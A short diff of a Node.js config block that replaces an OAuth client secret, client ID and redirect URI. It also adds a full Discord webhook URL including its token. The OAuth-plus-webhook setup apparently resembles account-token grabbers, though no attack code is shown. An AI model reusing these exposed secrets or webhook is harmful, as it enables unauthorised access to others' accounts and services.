@@ -1,8 +1,8 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const secret_value = '7af2e26e-920a-401f-a947-fafd36165df0'
+const client_id = '29b22f3c-5421-4339-a919-6ca71b39de03'
+const redirect_uri = 'https://discord-sdoz.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1113251184501866567/8kzNULmM7_11mutIDpqVq09XhQ1IHNa_ETu4sNNOsiYFZUp9Ki-Mwq90BrZo4sI3RKm_'
 //Requirements
 const axios = require('axios')
 const express = require('express')
